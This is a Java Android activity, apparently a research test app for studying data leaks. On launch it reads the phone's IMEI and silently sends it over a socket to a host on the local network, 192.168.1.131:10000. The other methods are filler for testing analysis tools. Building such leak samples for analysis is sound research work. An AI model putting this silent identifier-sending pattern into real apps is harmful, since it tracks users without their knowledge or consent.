package edu.fandm.enovak.leaks;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import androidx.core.content.ContextCompat;
import androidx.appcompat.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.widget.Toast;

import java.io.IOException;
import java.io.OutputStreamWriter;
import java.net.Socket;

public class SimpleLeak extends AppCompatActivity {
    public final static String TAG = SimpleLeak.class.getName();

    public int blah = 2;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_simple_leak);

        IMEI_LEAK(null);

        blah = 5;

        Log.d(TAG, "" + getData(15));

        TooManyRegisters(5, 432341234, 16.78);
        testTryCatch();

        experiment7();

    }

    private void experiment7(){

        Log.d(TAG, "output: ");
    }

    private int getData(int x){
        return 56 + x;
    }

    private void testTryCatch(){
        int numerator = 15;
        int denominator = 0;

        int ans = 0;
        try {
            ans = numerator / denominator;
        } catch (ArithmeticException ae){
            ans = 2;
        }

        Log.d(TAG, "division answer: " + ans);

    }

    public void IMEI_LEAK(View v){

        Thread t = new Thread(){
            public void run(){
                try {

                    Context ctx = getApplicationContext();
                    TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);

                    if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED){
                        Toast.makeText(ctx, "Phone state permissions required!", Toast.LENGTH_SHORT).show();

                    } else {

                        String IMEI = telephonyManager.getDeviceId();

                        String IMEIAndMore = IMEI + "user1";

                        //Log.d(TAG, IMEI);

                        Socket s = new Socket("192.168.1.131", 10000);
                        OutputStreamWriter out = new OutputStreamWriter(s.getOutputStream());
                        out.write(IMEI, 0, IMEI.length());
                        out.flush(); // actually write / send

                        // we're done!
                        out.close();
                        s.close();

                        int a = blah + 1;
                        blah = 3;


                        if(blah != 0){
                            Log.d(TAG, "" + getData(0));
                        }
                    }

                } catch (IOException ioe){
                    ioe.printStackTrace();

                }
            }

        };

        t.start();
    }

    public void TooManyRegisters(int a, long b, double c){
        int d = 6;
        int e = 7;
        int f = 8;
        int g = 9;
        int h = 10;
        int i = 11;
        int j = 12;
        int k = 13;
        int l = 14;
        int m = 15;
        int n = 16;
        int o = 17;


        Log.d(TAG, "a: " +  a + "  b: " + b + "  c: " + c);
        Log.d(TAG, "d: " +  d + "  e: " + e + "  f: " + f);
        Log.d(TAG, "g: " +  g + "  h: " + h + "  i: " + i);
        Log.d(TAG, "j: " +  j + "  k: " + k + "  l: " + l);
        Log.d(TAG, "m: " +  m + "  n: " + n + "  o: " + o);


    }
}

